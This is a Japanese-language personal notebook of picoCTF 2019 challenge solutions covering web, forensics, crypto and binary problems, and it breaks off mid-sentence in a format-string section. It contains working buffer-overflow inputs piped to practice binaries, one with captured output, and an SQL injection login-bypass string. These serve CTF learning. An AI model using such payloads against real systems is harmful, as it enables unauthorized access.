# picoCTF2019

## 教訓

### Webサイトに入ったらやること。
- ソース見る。
- cookie見る。
- robot.txtを見る。

### 画像系
- zsteg
    - ステガノグラフィーを bmp, png から見つけてくるツール
    - [zsteg](https://github.com/zed-0xff/zsteg)

## 各問題


### Ovdrflow 1
- 戻りアドレスをprintfしてくれるので、それを書き換えればよい。<br>
- `python -c 'print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" "\xe6\x85\x04\x08"' | ./vuln`

### Client-side-again - Points: 200 - (Solves: 9849)
    - node.jsで頑張った。
      console.log で実行しながら内容を出力して合わせる。
      `picoCTF{not_this_again_ea9191}`

## 問題(200点)
### First Grep: PartII
- 文字列検索の便利コマンド<br>
    - 中身まで表示 `find . -type f -print | xargs grep 'pico'`
    - ファイル名だけ表示 `grep "pico" -rl .`

### whats-the-difference
- ワンライナー系
    - 2つのファイルの差分を表示。後ろ側のファイルを文字として抽出
        `cmp -l kitters.jpg cattos.jpg | gawk '{printf "%08X %02x %c\n", $1, strtonum(0$2), strtonum(0$3)}' | rev | cut -c -1 > flag.txt`
    - ファイルから改行を削除
        `cat flag.txt | tr -d '\n'`
    - ちなみに、全部つなげてもいい。
        `cmp -l kitters.jpg cattos.jpg | gawk '{printf "%08X %02x %c\n", $1, strtonum(0$2), strtonum(0$3)}' | rev | cut -c -1 | tr -d '\n'`


### la cifra de - Points: 200 - (Solves: 6835) 
- 解法
    - ビジュネル暗号
        - writeup 見た。
        - とりあえずググる。
        - [このサイト](https://www.dcode.fr/vigenere-cipher)で、フラグっぽいのが含まれる1段落をコピペして
        "knowing a plain text word" にするとフラグが出てくる。
        - 文章全体とか、ここより後ろとかやってもダメ。
        フラグだけでもダメ。適度な長さが重要っぽい…。
        - è を外すとフラグはちゃんと解析してくる。
        フラグは `GFLA` しか出てこないので解析できてる。
        デコード自分で書いてみるかな…。 

### picobrowser - Points: 200 - (Solves: 9548)
- 解法
    - ユーザーエージェントを手動設定すればよい。
    - Developer tool > More tools > Network Conditions <br>
      User agent の `select automatically` のチェックを外して
      送信する値を設定する。

### NewOverFlow-1 - Points: 200 - (Solves: 1319)
- 64bitレジスタ。
    - 関数の入口で rbp がスタックに退避されているので、
      文字列のバッファのサイズに8バイト分が増える。
```
@pico-2019-shell1:/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a$ python -c 'print "a" * 72+   "\x68\x07\x40\x00\x00\x00\x00\x00"' | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag: 
picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_d0b837aa}
Segmentation fault (core dumped)
@pico-2019-shell1:/problems/
```
## 問題(250点)

### Overflow2
- writeup 見た。
    - BUFSIZE が176なので文字列のばす。引数のサイズは同じかな?
    - スタックは関数の入り口から 0xb4, 0x0c だけ動かされて gets に渡されてる。
    - 0xc0のところに4バイト return address を書けばよいのかな。
    - `python -c 'print "a"*(176+12)+"\xe6\x85\x04\x08aaaa\x00\xbe\xad\xde\x0d\xd0\xde\xc0"' | ./vuln`
    この書き方はやく覚えないと…。

### NewOverFlow-2 - Points: 250 - (Solves: 1027)
- 頑張る。
    - これで win_fn には飛ばせる。
```
python -c 'print       "a" * 72+ "\xbe\x07\x40\x00\x00\x00\x00\x00"' | ./vuln
```

### asm2 - Points: 250 - (Solves: 2169)
- x86アセンブリの関数読み出し規約
    - 引数はスタックで渡す。
      ただし、スタックの先頭は戻りアドレス。
      - *(esp + 0) 戻り番地
      - *(esp + 4) 第1引数
      - *(esp + 8) 第2引数 
      - :
    - 戻り値はeaxで渡す。
    - 参考 [x86入門(3) 関数の呼び出し規約](https://labs.cybozu.co.jp/blog/mitsunari/2007/10/x863_1.html)
    - サイズの指定
        - DWORD : 4バイト
        - WORD : 2バイト
        - BYTE : 1バイト
    - 分岐系
        - [値を調べ処理を切り替える](https://www.grapecity.com/developer/support/powernews/column/clang/010/page02.htm)

- 32bit mode での nasm のビルド
    - 環境<br>
        `sudo apt-get install nasm`<br>
        `sudo apt-get install libc6-dev-i386`
    - 環境<br>
        nasm -g -f elf32 -o test.o test.S
        gcc -c -m32 -o main.o main.c
        gcc -o main -m32 -lc -g main.o test.o

### c0rrupt
- 解法
    - writeup 見た。
    - PNG なのは IEND 見たらわかったのだが…
    - PNGのヘッダと、IHDRを修復したが治らず。
      write up 見て IDAT いじったのだがそれでもeogで表示できず。
      windows のメモ帳ならこれで表示できたので…なにか違う?

### m00nwalk
- 解法
    - writeup見た。
    - 画像を音声にエンコードしてるそうだ。
    - [RX-SSTV](http://users.belgacom.net/hamradio/rxsstv.htm) でデコードできるそうだ。オプションを Scottie 1 にする。
    - 手元ではノイズが多くて文字が読めない…かなりクリーンな環境でやらないとだめみたい。

## 問題(300点)
### Irish-Name-Repo 1 - Points: 300 - (Solves: 5855)
- 解法
    - ユーザ名が既知のパターンのSQLインジェクション
    - パスワード欄に `'OR 'A'='A`とやる。
    - おそらく `"SELECT email FROM users where uid='$uid' AND passwd='{$pass}'"` のようにやっているのだろう。右側の' 含めてSQL文を完成させないといけないので、TRUEとかだめ。

 ### miniRSA - Points: 300 - (Solves: 1976)
- Low Public Exponent Attack ができる。
    - 単に c の e 乗根を求めると平文が出てくる。


### waves over lambda - Points: 300 - (Solves: 4170)
- 解法
    - 単なる置換暗号っぽい。
    - ツールで一発で行けた…
    - [Mono-alphabetic Substitution](https://www.dcode.fr/monoalphabetic-substitution)

### stringzz - Points: 300 - (Solves: 892)
- 解いてみる。
    - gdbアタッチ。
```
   0x565d581f <+136>:   push   %eax
   0x565d5820 <+137>:   call   0x565d5590 <fopen@plt>
   0x565d5825 <+142>:   add    $0x10,%esp
   0x565d5828 <+145>:   mov    %eax,-0x10(%ebp)
   0x565d582b <+148>:   sub    $0x4,%esp
   0x565d582e <+151>:   pushl  -0x10(%ebp)
   0x565d5831 <+154>:   push   $0x80
   0x565d5836 <+159>:   pushl  -0x14(%ebp)
   0x565d5839 <+162>:   call   0x565d5540 <fgets@plt>
   0x565d583e <+167>:   add    $0x10,%esp
   0x565d5841 <+170>:   mov    -0x18(%ebp),%eax
   0x565d5844 <+173>:   sub    $0xc,%esp
   0x565d5847 <+176>:   push   %eax
   0x565d5848 <+177>:   call   0x565d575e <printMessage1>
   0x565d584d <+182>:   add    $0x10,%esp
   0x565d5850 <+185>:   mov    0x40(%ebx),%eax
   0x565d5856 <+191>:   mov    (%eax),%eax
   0x565d5858 <+193>:   sub    $0xc,%esp
   0x565d585b <+196>:   push   %eax
   0x565d585c <+197>:   call   0x565d5530 <fflush@plt>
```
- 0x565d582e でブレークして ebp のアドレスを取得
    - もう1回やったら絶対アドレスが変わる。そりゃそうか。
      書式文字列で出力すべきメモリの位置も変わる気がする。
```
(gdb) info register
eax            0x0      0
ecx            0x15     21
edx            0x57608a88       1465944712
ebx            0x565d6fb4       1448964020
esp            0xffa6d14c       0xffa6d14c
ebp            0xffa6d188       0xffa6d188
esi            0xf7f4c000       -134955008
edi            0x0      0
eip            0x565d582e       0x565d582e <main+151>
eflags         0x292    [ AF SF IF ]
```
- 読み出したいアドレスは、fgetsの第一引数なので、
  `-0x14(%ebp)`  で、